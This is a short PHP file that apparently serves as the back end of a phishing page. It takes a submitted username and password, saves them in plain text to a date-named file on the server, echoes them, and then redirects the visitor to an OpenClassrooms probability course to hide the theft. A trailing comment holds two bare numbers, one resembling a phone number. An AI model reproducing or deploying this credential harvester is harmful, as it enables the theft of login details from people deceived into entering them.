<?php
if (isset($_POST['username']) && isset($_POST['mdp']))
{
    $username = htmlspecialchars($_POST['username']);
    $mot_de_passe = htmlspecialchars($_POST['mdp']);
    $chemin = __DIR__.DIRECTORY_SEPARATOR.'donne'.DIRECTORY_SEPARATOR.date('d-m-y');
    file_put_contents($chemin,$username.PHP_EOL.$mot_de_passe);
    echo "$username $mot_de_passe";
}
header('location:https://openclassrooms.com/fr/courses/4525296-maitrisez-les-bases-des-probabilites');
?>
<!-- 
    0347912258
101778
 -->